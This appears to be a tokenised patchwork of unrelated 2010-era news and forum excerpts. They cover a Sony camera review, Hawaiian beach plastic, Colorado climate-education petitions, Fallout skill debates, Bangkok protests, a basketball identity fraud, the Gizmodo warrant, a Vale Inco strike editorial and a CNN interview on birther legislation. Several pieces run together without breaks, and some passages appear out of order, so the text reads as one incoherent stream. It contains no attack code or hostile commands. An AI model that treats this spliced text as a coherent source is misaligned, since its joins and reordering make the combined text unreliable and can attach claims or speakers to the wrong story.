The three - inch screen flips up or down , for shooting above or below eye level .
Now , to get this small , Sony had to push the envelope — and pull it , fold it and spindle it .
As with most other hybrids , this one has no built - in flash and no eyepiece viewfinder .
( A tiny snap - on flash comes with the camera , and a glass viewfinder that works with the standard lens will cost about $ 200 and will become available in July . )
And there ’s room for only six buttons , compared with about 25 on an S.L.R .
Yet the camera offers most of the controls of a typical consumer S.L.R. , plus some great features from amateur cams .
The price is right : $ 600 .
Or you can save $ 100 and get the NEX - 3 , which has a plastic body instead of a metal one .
For that price you get a non-zooming 16 - millimeter lens ( 24 - millimeter film equivalent ) .
On the camera , this lens is flat enough to fit in a coat pocket , but beware some distortion at the edges of the frame .
For $ 50 more , you can get either camera with a 18 - 55 - millimeter ( 3X zoom ) lens instead .
An 18-200 - millimeter ( 11X zoom ) lens will be available this fall for about $ 800 .

Consumer waste from the " Great Pacific Garbage Patch " is turning a Hawaiian beach " into plastic " , Tropic of Cancer presenter Simon Reeve has found .
Conservationist Sam Gon escorted him to the remote Kamilo Beach on Hawaii , where plastic bottles , bags , tyres , rusting petrol cans , and other waste from around the world washes up .
They found more plastic particles than sand , as they dug a hole on what has been described as " the world 's dirtiest beach " .

And so to Mesa County in Colorado where this week the first labour pains of what seems to be the birth of a new movement in the US were felt .
Dozens of protesters attended a meeting of School District 51's Board of Education to hand over two petitions aimed at keeping political views out of the county 's classrooms .
According to reports in the local press , Rose Pugliese , a local lawyer and failed Republican candidate for the board of education , authored both of the petitions .
The first , which gained 600 signatures of support , simply wished for teachers not to express their " personal , political views " to pupils , whereas the second , which gained 700 signatures , sought to stop the teaching of global warming to children .
" [ Global warming ] is not a proven scientific theory .
There is not evidence to support it , " Pugliese told the board , according to a report in the Denver Post .
It 's unclear from the reports whether the petition explicitly called for any teachings about global warming to be stripped from schools , or whether it called for the " other side of the story " to be taught , as Pugliese and her supporters seemed to be arguing before the board .
Pugliese , who is also a prominent member of a local Tea Party group called the Western Slope Conservative Alliance , was supported at the meeting by a local PR consultant called Laura Kindregan , who is the Colorado representative of a national group calling itself Balanced Education for Everyone .
It was launched in April to assist " concerned citizens around the country in challenging public schools to provide balanced education on the issue of global warming " .
It is itself an umbrella organisation of the Independent Women 's Forum , a conservative group whose notion of feminism is a tad different to most Guardian readers ' understanding of the term .
The board of education will now mull over the issues raised by the petitions , but the episode serves to expose the rising tide within rightwing circles in the US to suppress the teaching of " liberal " issues such as climate change in schools .
Or if it can't be suppressed , then at least some " balance " should be applied .
For example , Balanced Education for Everyone heavily promotes the showing of Phelim McAleer 's Not Evil Just Wrong as a counterpoint to Al Gore 's An Inconvenient Truth .
McAleer is an agitating Irish filmmaker who views climate change as " junk science " and who – as was the case with Martin Durkin 's The Great Global Warming Swindle – has been accused by climate scientists of misrepresenting their views through the manipulative editing of interviews .
( For example , look at McAleer 's edit of his exchange last December with Professor Stephen Schneider , and then look at the unedited exchange . )
The strength of the connection between Laura Kindregan and Phelim McAleer is also revealed on the website of Amali , her PR consultancy , which states that " Amali is working with Not Evil Just Wrong on a campaign for balanced education in the schools through this incredible documentary " .
Balanced Education for Everyone is a group that warrants closer inspection , it seems .
First , why does it place so much stock in the worth of Not Evil Just Wrong ?
Go to the " Parent 's Resources " section and all it seems to be saying is get your child 's school , by any means possible , to screen this documentary , which " proves that the real threats to America ( and the rest of the world ) are the flawed science and sky - is - falling rhetoric of Al Gore and his allies in environmental extremism " .
The website of the film itself even supplies downloadable " educational resources " ( pdf ) to be used in schools .
Surprise , surprise , the panel of " expert reviewers " includes well - known climate sceptics such as Pat Michaels , a senior fellow at the Cato Institute , a rightwing thinktank with a long history of promoting ideologically tainted misinformation about climate change .
The biog makes no mention of this , of course .
That it 's hard to put a cigarette paper when it comes to ideology between any of these players arguing for " balance " in the teaching of climate change in schools is not a great shock .
As has been observed for years , most climate scepticism is fostered and dispersed from a well - defined frequency of the political spectrum .
In other words , it is typically ideological objections to the proposed solutions rather than genuine scientific objections to the science that now drive so much of the climate scepticism we see and hear , particularly in the US .
Genuine educational balance is , of course , a worthy goal , but the great irony here – and , to a certain extent , dishonesty - is that these overtly political groups and individuals are explicitly arguing for politics to be eliminated from classrooms .
And the best thing they can arm themselves with , it seems , is the polemical documentary Not Evil Just Wrong .
So , here 's a suggestion : in the name of balance , let 's just rid our schools of all these documentaries , An Inconvenient Truth included .
Surely , it 's possible to teach children about climate change in a balanced manner without relying on such controversial teaching aids ?
How about sticking to good old science text books ?
Oh , but it looks like the same forces have their sights set on those , too .

Ya small guns / big guns kind of weird , maybe mistranslation there donno .
As far as the strip , hate to point out the obvious but someone built that after the apocalypse , hence NEW Reno or NEW Vegas , not to mention the Vault 21 sign which I 'm sure was n't built before the Apocalypse .
I do n't think FO3's problems can be solved without a full revamp there pretty much just making one giant mod of FO3 with new story line .

Posted : Mon May 24 , 2010 12:50 am I actually do n't mind the Van Buren SPECIAL .
To me , big / small guns is neither here nor there .
What I would be more interested in seeing , is actual worth in the SPECIAL system this time around .

You do n't care that it 's being dumbed down but you are interested in seeing that it is not dumbed down ?
This makes perfect sense .

To me , in the original Fallouts it seemed poor design to make small guns early game weapons , then require you to put skill points into heavy or energy weapons later in the game .
All three should have been viable choices throughout the game - like the various non-combat skills - or simply rolled into one skill .

What I meant , is I liked the simplicity and fairness of Van Buren 's skillset , and would n't mind seeing it used in Future Fallouts , as long as the SPECIAL system is actually relevant this time around .
For example , it did n't really matter what skills you chose in Fallout 3 , it was an FPS and played like one .
I do n't so much care about the skills being simplified , as long as they actually have some use .
Van Buren had , in my opinion , enough choices available to make completely different characters .

If the German version is accurate , then no : there is no translation error .
They are merged into one skill .

The only Big Gun that is actually a gun in Fallout 3 was the minigun , so it will be the only one merged with Small Guns .
The other ones will be merged with Explosives , which is now a pretty useless skill and will make it more useful .

Anti-government protesters have been rallying for weeks
Tens of thousands of Thai protesters have occupied central Bangkok in their latest push to topple the government .
Crowds defied warnings to leave or face arrest and settled in for the night .
The government says the rally is illegal and is negotiating with them .
The anti-government protesters , known as the red-shirts , are calling on Prime Minister Abhisit Vejjajiva to dissolve parliament and hold early elections .
The red - shirted demonstrators have been holding regular protests for weeks .
' Peaceful ' Saturday 's demonstrations saw central roads in the capital blocked , traffic halted and at least two of Thailand 's biggest shopping malls forced to close .
The BBC's Rachel Harvey in Bangkok says there is no sign of protesters dispersing .
She says there is also no sign of security forces and the atmosphere is still good - natured and peaceful .
Mr Vejjajiva has said he will hold elections by the end of the year - an offer the protesters have rejected .
There have already been two unsuccessful rounds of talks to resolve the crisis .
On Friday business leaders , academics , and people from the tourism industry turned out wearing pink shirts to call for an end to the crisis and show their continuing support for the government .
They numbered several thousand but did not match the tens of thousands that have attended the red - shirt rallies .
The red - shirted protesters are mostly supporters of former Prime Minister Thaksin Shinawatra , an exiled former telecoms tycoon who was ousted in a coup in 2006 .
Many are from rural areas , and they have portrayed themselves as fighting for democracy .
They say that Mr Vejjajiva 's offer of holding elections a year early is not enough , and that they are only willing to hold more talks if the prime minister brings forward his timetable .

Last week , I was introduced , by way of ESPN.com news services to the story of 22 - year - old former Texas high school basketball player Guerdwich Montimere -- and his alleged 16 - year - old alias , Jerry Joseph .
Coaches familiar with Montimere 's career in Fort Lauderdale , Fla . were utterly convinced Montimere was posing as the younger Joseph and playing high school hoops in West Texas .
FBI fingerprint analysis had supposedly cleared Joseph , but the coaches did n't believe it :
" I 'm 100 percent sure .
I would bet my paycheck , " Smith told the South Florida Sun-Sentinel .
" We saw him .
We 've known Guerdwich since he was in seventh or eighth grade .
The mannerisms were him .
It does n't make sense .
They have to do more investigations for me , " Smith told the newspaper .
Either Joseph was Montimere , or someone was putting Joker gas in the spigots of high school coaches in Florida .
One of the two .
Turns out -- you 're not going to believe this -- the coaches were right .
Joseph was Montimere .
A 22 - year - old was posing as a 16 - year - old hoopster .
And I 'm even more baffled by this story than before , which has to be some sort of bafflement record .
From the AP story :
He also presented himself as homeless to the school 's basketball coach , Danny Wright , who took the boy in last summer , the coach said .
Montimere was arrested at Permian High on Tuesday and booked into Ector County jail on a charge of presenting false identification to a police officer .
" I feel like I was hit by a ton of bricks , " district athletic director Leon Fuller said .
" In my 50 years in education , I 've never heard of anything like this . "
Wright told The American that the player was like a family member .
" This affected a lot of people .
The whole school of Permian embraced that kid .
He deceived us and played on everyone 's emotions , " Wright said .
You know , I learned something today : Never doubt the word of several coaches who seem , all evidence to the contrary , convinced of a player 's identity .
Also , never take your eye off someone whose name sounds like a Victorian villian's .
Oh , and never trust a guy with two first names .
But you knew that already .
Every so often a politician is quoted as saying something so surprising that it can stop you in your tracks .
Sen. John McCain ( AP Photo / Matt York )
Washington
Wire had one of those moments today when we read the latest issue of Newsweek , which quotes Republican Arizona Sen .
John McCain distancing himself from his well - established and long - nurtured national persona .
“ I never considered myself a maverick , ” he told Newsweek .
“ I consider myself a person who serves the people of Arizona to the best of his abilities . ”
The statement is stunning on many levels , not least of which because the maverick persona was hammered by the McCain - Palin ticket in the 2008 campaign and long - cultivated by the senator and his supporters years before his presidential bid .
Former Alaska Gov. Sarah Palin apparently did n’t get the maverick memo when she campaigned as recently as March 26 for McCain ’s Senate re-election bid .
“ Send the maverick back to the United States Senate , ” Palin declared .
Washington
Wire took a quick stroll down memory lane for some of McCain ’s greatest maverick hits , below .
And we wonder :
If McCain is no longer the maverick , what should he be known as ?
– Palin did her part in pushing the maverick line in the 2008 campaign , where she regularly referred to both her and McCain as mavericks .
“ Now John McCain , with a track record of proving he ’s not just a patriot in the Senate , he ’s known as the maverick , ” she said during a Nov. 2008 campaign stop in Ocala , Fla .
– In the lone vice - presidential debate with Joe Biden , Palin said the word “ maverick ” no fewer than 15 times …
Judge Clifford V. Cretan in Redwood City today ruled against the San Mateo County District Attorneys office and ordered the Gizmodo warrant unsealed .
Gizmodo recently came into possession of an unreleased iPhone 4G prototype .
After publishing photos and video of the device , police raided the home of editor Jason Chen using what may have been an illegal warrant .
The District Attorneys office argued that unsealing the documents would reveal identities of potential witnesses and compromise their investigation .
Bloomberg and other media organizations argued they should have access to the documents based on constitutionally protected free - speech rights .
The countys argument relies only on its right to maintain the security of an ongoing investigation ,  said Katherine Keating , a lawyer for the media organizations .
 What the District Attorney hasnt done beyond making these vague assertions is explain what exactly is in the records  that justifies keeping them secret in light of  the publics right of access to judicial records ,  she said .
Keating represents the First Amendment Coalition , a San Rafael , California - based group , and six media organizations , including Bloomberg News , CBS Corp.s CNet News and the Los Angeles Times .
We will post the warrant once it becomes available ...

Nowadays , most of us seldom use our optical drives since everything is downloaded .
If you 'd like to see your optical drive get some love , turn it into an iPod dock with some scissors and an old CD , while still keeping it usable .

This mod is pretty easy ; you likely wo n't need any extra materials since it mainly involves cutting up an old or blank CD and putting that together with the plastic docker that came with your iPod .
Small wire cutters are probably the easiest way to go about cutting up the CD , although anything you have lying around should work — though you might go through more than one before you get it right .
You wo n't be doing anything to the drive itself , so you 'll still be able to use it on those few occasions that you need to install some software or rip a CD .
After cutting up the CD to fit the docker , you just need to tape the docker on and put your new contraption into the CD tray .
Note that you 'll need to make sure your computer does n't close the tray automatically after being open for awhile or when you shut down , as this will make a mess of your dock and iPod cable .
Otherwise , though , it should make a nifty little dock for your iPod ( certainly much cheaper than the one Apple sells ) , and give some use to your likely dusty , unused optical drive .

In an apparent desire to secure more reliable means of long - distance travel , people traveling in Europe are more often riding its famous high - speed rails , instead of booking with an airline , a post to www.eurotunnel.com announced Wednesday .
Online reservations recorded by www.eurotunnel.com, where travelers can book travel through the famous Channel Tunnel , have risen 30 percent .
Traffic to www.eurotunnel.com has increased 50 percent .
In addition , the U.K. website www.breakingtravelnews.com speculates that expectation of a series of strikes by the union representing cabin crew employees of British Airways , is another factor that has driven up the quantity of bookings recorded by www.eurotunnel.com, and amount of traffic riding the high - speed rails in general , in recent weeks .
The websites www.eurotunnel.com and www.raileurope.com both offer multiple classes of ticket with varying cancellation flexibility options .
And a representative of Eurotunnel pointed out that the surge is noticeable in all ticket classes , from economy to first class .
Eurotunnel believes that both business and leisure travelers on intra-European itineraries are making the jump , at least temporarily , from airlines to ground transportation .
No charts or graphs of the data were posted onto either www.eurotunnel.com or www.breakingtravelnews.com at the time of this post .
It is not clear if www.eurotunnel.com website traffic that has increased 50 percent is in terms of hits to the website , or unique visitors to the website , or something else altogether .
The report is also not clear on what previous data the increases are relative to .
Moreover , no corresponding decrease in air travel bookings was noted by the report .
The Channel Tunnel , linking the county of Kent , in England ( United Kingdom ) to the department of Pas - de - Calais in France , opened ceremonially in the spring of 1994 , and accommodated its first passengers in autumn of that year .
The Tunnel is owned by Eurotunnel .
Eurotunnel and Eurostar operate trains through the English Channel , along the underwater route , which is 31 miles long .

Steelworkers officials dismantle blockade at Vale Inco
By Carl Bronski
14 May 2010
United Steelworkers ( USW ) union officials dispersed a burgeoning rank - and - file protest at entrances to Vale Inco ’s Clarabelle Mill and Coleman Mine in Sudbury , Ontario Wednesday — the day before the strike by 3,300 nickel miners and ancillary workers at Vale Inco ’s Sudbury and Port Colborne operations entered its eleventh month .
Last Friday striking workers placed railroad ties across entrance roads and brought in trailers in which to sleep after labour mediator Kevin Burkett announced that exploratory talks between the company and the union had broken down .
The workers , supported by non-striking members of the community , vowed to maintain their blockade until a settlement was reached .
Although Vale Inco , which has mounted a scabbing operation since last October , stated that milling operations would not be affected by the blockade for at least a week , company lawyers made emergency appeals to Superior Court Justice Robbie Gordon to outlaw the workers ’ action .
Gordon rushed to rule in the company ’s favour , issuing an order against the blockade Monday morning that cited the picket - line protocols that the union bureaucracy had agreed to under pressure from the courts earlier in the strike .
The USW officialdom was quick to respond to the court ’s decision .
Local 6500 President John Fera , Vice - President Rick Bertrand and Chief Steward Pascal Boucher immediately visited the protest sites to tell workers that they could face legal consequences if they did not stop their action .
Vale Inco has already summarily dismissed at least nine strikers during the dispute for not “ acting within ( Vale ’s ) code of conduct ” .
When a sheriff read the court ’s order to the hundreds of protestors , they refused to move , chanting “ Hell no , we wo n’t go . ”
The police , who have so far counted on the machinations of the union officials to prevent the strike from becoming a militant fightback against the company ’s scabbing operation , were clearly unprepared for resistance to their order to disperse and retired without further action .
Supporters of the blockade were adamant .
A pilot at the Clarabelle entrance interviewed by the Sudbury Star said , “ Our union is ruined .
We ’re here to fight for other people …
It ’s my right as a citizen to freely assemble and protest .
I thought I lived in a free country . ”
Lise Levesque , an organizer of the action at the Coleman Mine and the wife of a striking miner , told the Star , “ I ’m scared that we ’re going to end up just like you see on the news in Brazil or in those other countries .
Or in Greece right now …
Take the shotguns , do whatever .
I do n’t care .
I really do n’t .
You know West Virginia just lost 29 men .
Is that what ’s going to happen here before anybody steps up to the plate ? ”
Monday night , workers buttressed their campsites with additional supplies .
On Tuesday , company lawyers complained to the court that the police had failed to dismantle the blockades .
The outnumbered police , fully cognizant of the powder keg in the strike - bound city , pleaded with the court for more time to “ develop ” their “ response to the situation . ”
A frustrated Judge Gordon then intoned , “ The police have not acted , to my knowledge , in a single incident .
In the three days that the barricades have been up , the police have ignored them . ”
With the rank - and - file action growing in strength , the union leadership ’s overriding concern was to shut down the blockade lest it trigger a broader mobilization .
Membership meetings were suddenly announced for Wednesday so as to provide the strikers with an update on last week ’s failed negotiations — negotiations that the union initially denied were even being held .
( See : “ Canada : No concessions strike against Vale Inco in jeopardy ” )
For several weeks , it has been an open secret in Sudbury that the union bureaucracy has capitulated before the company ’s concession demands and that the major sticking point in ending the dispute has become the back - to - work protocol .
Vale management , intent on completely emasculating the union , is adamant that none of the nine fired strikers will be allowed to regain their jobs .
The union officialdom , for its part , is arguing that in order to force through ratification and otherwise continue to be able to police the membership , the company needs to provide them with a face - saving agreement concerning the dismissed workers .
As the blockade grew in open defiance of the courts at the beginning of this week , USW lawyers stepped up pressure , including behind - the - scenes appeals , for the Ontario Labour Relations Board ( OLRB ) to expedite adjudication of a bad - faith bargaining complaint against the company concerning the nine fired strikers .
The OLRB was not due to continue hearings on this and other bad - faith bargaining grievances filed by the USW against Vale Inco until the end of June , but by midweek the board relented so as to help the union in shutting down the blockade .
On Wednesday morning , Local USW 6500 President Fera and Canadian Steelworkers District 6 President Wayne Fraser attended the two blockades so as to announce that a Labour Board hearing on the fate of the nine has been scheduled for Friday .
( What they did not say is that the company has objected to separating the complaint concerning the nine from the rest of the bad - faith bargaining grievances and that Friday ’s OLRB hearing will begin with company lawyers filing a motion for the matter to be put off till the previously scheduled June 25 hearing . )
Many at the blockade were reluctant to end their action .
But with it ever more clear that the union was lining up with the police , the courts and the company to suppress their initiative , the protestors took down the blockades .
A striking smelter worker said , “ It was very difficult this morning to hear our leaders tell us to leave . ”
Alan Asher , a supporter from the community at the blockade , said , “ I do n’t think this is the time now to end the blockade .
We can recognize a bully when we see one and [ Vale Inco ] is acting like one . ”
This has not been the first time that the union bureaucracy has sought to channel the determined struggle of the striking workers into political and judicial dead ends .
At the outset of the dispute , union officials lobbied the federal Conservative government of Stephen Harper to release information on the conditions that the government imposed on Vale when the Brazil - based company purchased Inco in 2006 .
The government refused , citing legally binding confidentiality provisions .
Next up was a series of international publicity stunts — lobbying stockholders in New York and bringing birthday cake to the company ’s headquarters in Brazil .
Then the union fell back on appeals to the labour board , which in the face of the continuing scabbing operation undertaken by the company , have proven fruitless .
Indeed , a New York metal market spokesman breathlessly announced this week that Vale Inco would resume refined nickel ingot shipments to U.S. markets next month .
This he declared was “ tangible evidence that Sudbury production is now making its way into the supply chain ” .
Recently the union has resurrected the demand that the big- business government of Ontario Liberal leader Dalton McGuinty adopt a provincial anti-scab law .
Liberals in both the federal and Ontario parliaments , alongside Conservatives , have consistently voted down such proposals .
For their own part , the New Democratic Party ( NDP ) , which provides lip service to anti-scab proposals , has refused over the past decade to pass such legislation in any of the provinces where it has held power .
On Wednesday , McGuinty was unequivocal in his rejection of the USW ’s entreaties , calling instead for negotiation and conciliation .
In other words , the government continues to give Vale Inco carte blanche for its strikebreaking offensive .
According to press reports , at Wednesday ’s union membership meetings workers who had participated in the disbanded blockade action made angry statements blaming the hundreds , if not thousands , of union members who did not actively participate in the five - day protest for the strikers ’ current predicament .
Their emotions , however heartfelt , were entirely misplaced .
It has been the union leadership — the USW , the Ontario Federation of Labour and the Canadian Labour Congress — and their allies in the social - democratic NDP that have isolated and demobilized the strikers , slowly smothering their militant struggle under a barrage of worthless appeals to the capitalist state and the big business political parties .
Workers voted down Vale ’s punitive concessionary contract by some 88 percent last July .
In March , after eight months walking picket lines in the frigid cold of Northern Ontario , they voted down another miserable contract offer by an even larger margin !
If the Inco workers ’ no-concessions struggle now stands in mortal jeopardy , it is entirely due to the actions of the union bureaucracy , which acts not as the representative of the membership but rather as an arm of the corporations within the rank and file .
They have policed the anti-worker injunctions issued by the courts and signalled their readiness to accept massive concessions .
Now they are imploring Vale Inco management — and the labour board — to allow them to play a role in designing the back - to - work protocols in hopes that , by doing so , they will maintain a semblance of credibility amongst their membership .
This week ’s blockade shows the way forward .
Workers must take the strike out of the hands of the bureaucracy and organize rank - and - file committees independent of the USW to shut down scab production and strive to make their struggle the spearhead of a working - class counteroffensive against big business ’ drive to make working people pay for the capitalist crisis through wage and job cuts and the dismantling of public and social services .
Above all , Vale Inco workers and their supporters must draw the political lessons .
The traditions of militant working - class struggle associated with cities such as Sudbury must be revived and imbued with a program to mobilize the working class in independent industrial and political struggle against concessions and in defense of the jobs of all workers , the world over .
If capitalism is incapable of providing working people with a decent standard of living — and it cannot — then working people , those whose collective labour produces society ’s wealth , must advance their own plan to organize production and employment internationally based on human need , not private profit and shareholder value .
In a surprising show of stick - to - itiveness ..
Mr Cooper appeared to get the bit in his teeth and run his head .
With questions for Rep Ash such as " you know that 's actually not true ? " , " this is completely partisan , no ? " and " is n't it your job as a leader to actually lead ? " , he dragged our opponents up and down the field , scoring at every turn .
Rep
Ash was backed into the center of his beliefs to the point of trying to explain why he can't ' believe '
Obama 's birth cert is legit just because it 's available on the internet , and he has n't validated personally , and yet that everything he does profess ' belief ' in is unsubstantiated and disproven rumer from the internet , which he has n't validated personally .
He says he voted for the bill just to ' be sure ' no one running for President in the future ' sneaks through ' .
Not , of course , that he 's saying Obama has , naturally , but you can't be too careful , some 234 years and forty - four Presidents after the country was formed ..
Five other states are considering the idea .
But , before we go any further , let 's just walk over to the wall .
Let 's just get a couple of things out of the way here , so we 're all on the same page .
First up tonight , the birthers are back .
Legislators in a number of states are listening , and Arizona Republicans are trying to pass laws in response -- the Arizona House of Representatives this week passing legislation to require a candidate to show a birth certificate in order to get on the presidential ballot .
Republicans in Arizona are trying to demand that presidential candidates produce a birth certificate in that state .
Five other states are working on similar measures .
Tonight , you will hear directly from one of the Arizona lawmakers who voted for the bill .
ANDERSON COOPER , CNN ANCHOR : " Keeping Them Honest " tonight :
The birthers are back .
And , this time , legislators are listening .
Working video thanks to Rambler :¬)
CNN 's podcast of the show : http://edition.cnn.com/...
Here 's the relevant parts of the transcript ( full transcript of the show is here .
( BEGIN VIDEOTAPE )
COOPER : Joining us now is Arizona Republican State Representative Cecil Ash , who voted for the measure .
Thanks very much for being with us .
Do you believe Barack Obama is an American born in Hawaii ?
CECIL ASH ( R ) , ARIZONA STATE REPRESENTATIVE :
All the evidence I have seen is that he was born in Hawaii .
I have seen a birth certificate on the Internet .
Of course , you can't believe everything you see on the Internet .
So , I have never personally investigated it or studied it .
COOPER : But , Oklahoma , it sounds like you 're -- really saying you believe it , but you do n't believe what you read on the Internet .
So , you do believe he's an American , though ?
ASH : Yes , I do .
COOPER : I mean , as you said , the certificate of live birth is available for anyone to see .
It 's been released .
And , in Hawaii , there are only electronic records at this point , and the health department there has verified it .
They have made public statements .
So , why vote for something which perpetuates these false Internet rumors ?
ASH : Well , Anderson , I think there 's been a lot of controversy over the issue .
It 's created a division among a lot of people in the United States .
And , for better or worse , many people do n't believe he is a U.S. citizen .
They believe he has loyalties -- divided loyalties , I suppose you could say .
COOPER : Right , but those people are wrong .
I mean , he is a U.S. citizen .
ASH : Well , you 're telling me that he 's wrong .
I have never investigated that .
If he is , then he has nothing to fear .
COOPER : But -- but , I mean , that -- the information is out there .
It has been released .
It has been shown .
There are some people who do n't believe it , but there are also some people who believe that the moon is made out of cheese .
And you can say you have never investigated it , but I think you would probably say the moon is not made out of cheese .
ASH : Well , I certainly would .
But the reason I spoke up on this bill is simply because there is a lot of division in the country .
And I believe this would put an end to any future controversy about a president 's qualifications .
COOPER : You told our producer you voted for this because you get a lot of calls from constituents with questions based on things they have read on the Internet .
I mean , is n't it your job as a leader to actually lead , not to throw up your hands and say , well , who knows what 's real or not on the Internet , to actually say , well , actually , you know , Hawaii has released this information , and it 's factually correct ?
ASH : Well , as I said , I have n't personally investigated that .
But I -- I think that , if -- if ...
COOPER : But , I mean , there 's plenty of things you believe that you have not personally investigated .
ASH : That 's true .
COOPER : Why , this , are you holding onto ?
ASH : Well , what we 're requiring here is for a -- a presidential candidate to demonstrate he is qualified .
And I do n't think having any presidential candidate -- candidate show that he 's qualified by demonstrating the requirements of the requirements , that there 's any problem with that .
COOPER : You told my producer you thought the president spent a million dollars fighting the release of his birth certificate , and then that raised concerns for you .
( CROSSTALK )
ASH : That 's what I have heard .
As I said , it ...
COOPER : Right .
But that 's not -- you know that 's actually not true ?
ASH : I -- I do n't know that that 's not true .
As I said , I have n't studied it .
You get a lot of information on the Internet .
As you know , much of it is inaccurate .
This has not been a focus of my attention for the last two years .
But I know it is a matter of -- of controversy for many people .
And I looked at this as simply a -- a means to end that controversy .
COOPER : You -- you also said to our producer that the president identified himself as a foreigner on his college application .
ASH : Yes .
COOPER : You know that 's not true , right ?
ASH : I did n't know that that was not true .
COOPER : That 's a story that was put out on April Fool 's Day .
It 's a fake AP news story .
ASH : Like I said , I -- I 'm reluctant to read anything I read on the Internet , including the evidence about his birth certificate .
This -- this is not the responsibility of the average citizen .
COOPER : So -- so -- so , the only -- the only way you will believe a birth certificate is if , what , you see it for yourself at the state office in Hawaii ?
I mean , to not believe anything that is put out by anyone , then how can you believe anything ?
I mean ...
ASH : Well , it 's -- it ...
( LAUGHTER )
ASH : It 's not my -- it 's not my responsibility ...
COOPER : Do you believe ...
( CROSSTALK )
ASH : ... to check the qualifications .
When someone comes to be on the ballot in Arizona , it 's not my responsibility to check those qualifications .
It 's the responsibility of the secretary of state .
And , so , all we said is , if -- if it 's required that you be a natural - born citizen , he should determine that .
Now , you -- you argue this in terms of what 's happened to Barack Obama .
I 'm thinking in terms of the next nominees down the road .
COOPER : But this is all about Barack Obama .
I mean , this is -- this is completely partisan , no ?
ASH : Well -- well , that 's why I spoke up on the bill .
They were -- the other side , the Democrats , were saying this is racist ; it 's to embarrass Barack Obama .
And I spoke up to say , this is not a matter of race .
It 's not a racist issue .
I 'm merely voting for the -- as you call it , the birthers amendment .
COOPER : So , where was George Bush born ?
ASH : I have no idea where George Bush was born .
COOPER : But you -- that was n't a concern for you when he was in office ?
ASH : The issue never came up .
COOPER : What about Bill Clinton ?
Where was he born ?
ASH : I have no idea .
COOPER : So , all of a sudden , you 're concerned about where the president of the United States is born , based on calls you 're getting from constituents who are misinformed ?
ASH : Actually , I did not get any calls from constituents until after this bill was passed .
But I do n't think there 's any harm in requiring someone to demonstrate that they meet the requirements for the position .
Now , nobody can deny -- regardless of what you believe about President Obama , nobody can deny that there 's been a controversy .
You may deny ...
COOPER : Well , yes , but there 's controversy about everything .
People -- and there -- but there are things called facts , and you know the facts .
You are a leader .
You know the facts .
Is n't it your job -- when a constituent calls and says , gosh , I 'm reading all this stuff on the Internet that President Obama was a -- was foreign exchange student , to say , actually , no , he was n't ?
I mean , is n't it -- that your -- part of your job ?
ASH : Look , President Obama is president now .
For the future , this kind of controversy should not come up again , because they will have to establish that up front .
And that will avoid this kind of controversy in the future .
COOPER : To your critics who will say that you and the other Republicans -- only Republicans voted for this -- are simply pandering to a misinformed electorate , that , rather than setting the record straight yourselves , you 're just pandering .
You 're kind of throwing up your hands and saying , gosh , I do n't know , there 's a lot of stuff on the Internet , a lot of it seems controversial , we need this bill , rather than saying , actually , this information is false .
ASH : Well , I think our purpose was to avoid this kind of controversy in the future .
And I think that 's appropriate .
That 's our job as leaders is to eliminate the possibility of this kind of controversy in the future .
COOPER : State Representative Cecil Ash , I appreciate your time .
Thank you , sir .
ASH : Thank you very much .
Bye .

Advertisement Thai forces in Bangkok have fired live rounds after surrounding a fortified protesters ' camp amid clashes that left at least eight people dead .
Embassies were closed as protesters set fire to a police bus and shot fireworks at troops , who also responded with tear gas and rubber bullets .
A BBC correspondent says the area is like a war zone with troops firing into a park as a helicopter circled above .
The demonstrators want the prime minister to resign and call elections .
Many of the so - called red- shirt protesters support former Prime Minister Thaksin Shinawatra , who was ousted in a 2006 coup .
Journalists shot The Bangkok authorities have cut off water and electricity to the camp in a renewed effort by the Thai government to reclaim the city centre .
AT THE SCENE Rachel Harvey , BBC News , Bangkok Inside their fortified encampment the protesters are digging in and preparing for a siege .
Outside , soldiers are battling to control the main roads as groups of angry demonstrators do everything in their power to stop their advance .
A bus was set ablaze to block one main road .
Elsewhere , protesters have piles of broken concrete , petrol bombs and fireworks at the ready .
Troops have used live rounds , rubber - coated bullets and tear gas to try to disperse them .
The British ambassador has urged both sides to step back from the brink and return to the negotiating table .
But there seems little chance of that in the current volatile atmosphere .
As night fell the sound of gunfire and explosions filled the air .
Violence escalated after a renegade general who was backing the protest was shot by an unknown gunman on Thursday , leaving him in a critical condition .
The British embassy was among several foreign missions closed on Friday .
At least seven people were killed on Friday and a demonstrator was shot dead on Thursday night .
More than 100 people have been wounded , reports quoting hospital sources say .
Broadcaster France 24 said its Canadian - born TV reporter Nelson Rand had been hit in the leg , hand and abdomen .
He has undergone surgery and is said to be recovering .
A Thai cameraman from the VoiceTV news website and a photographer for the Thai newspaper Matichon were both shot in the legs , their news outlets said .
Residents fled as gunfire rang out when thousands of soldiers moved in to seal off access to the protesters ' camp .
The troops advanced on hundreds of demonstrators who had set up a checkpoint outside the Suan Lum night market , popular with tourists , to stop soldiers approaching their main base .
A government spokesman , Panitan Wattanayagorn , told the BBC's World Today the security forces were not trying to storm the barricades .
" We want to cut down a number of activities including the logistics , sending in the fuel and gasoline trucks , " he said .
Later , in a televised address , he said it was hoped the situation would return to normal in the " next few days " .
' Tightening the noose '
Thousands of protesters , including women and children , have reinforced their bamboo barricades and vowed to maintain their sprawling camp in a commercial district of Bangkok .
If you are here , think whether it is essential for you to be travelling around the city in the current environment
Quinton Quayle
British ambassador
Live : Unrest in Bangkok British embassy in Bangkok shuts
In Pictures : Bangkok violence " They are tightening a noose on us but we will fight to the end , brothers and sisters , " one protest leader , Nattawut Saikua , told a cheering crowd , reports news agency Reuters .
Guards were seen at the sprawling protest site armed with slingshots and arrows .
The authorities have also begun to cut public transport and some mobile phone services to the area occupied by the protesters , most of whom are rural poor .
With their own supplies of water and food , the demonstrators appear braced for a long siege , says our correspondent .
Briton Robert Haydock has been watching part of the stand - off from the balcony of his home in the city .
He said soldiers were advancing and then retreating on Ratchaprarop Road , close to the Ratchaprasong protesters ' camp .
" I have seen soldiers clear streets by firing automatic weapons in response to red - shirt supporters throwing various objects at them including Molotovs ( petrol bombs ) .
" There has been a number of big explosions and helicopters are flying overhead . "
Who shot Red ?
The latest clashes come a day after rogue Thai General Khattiya Sawasdipol , better known as Seh Daeng ( Commander Red ) , was shot in the head .
He has been organising the red- shirts ' security .
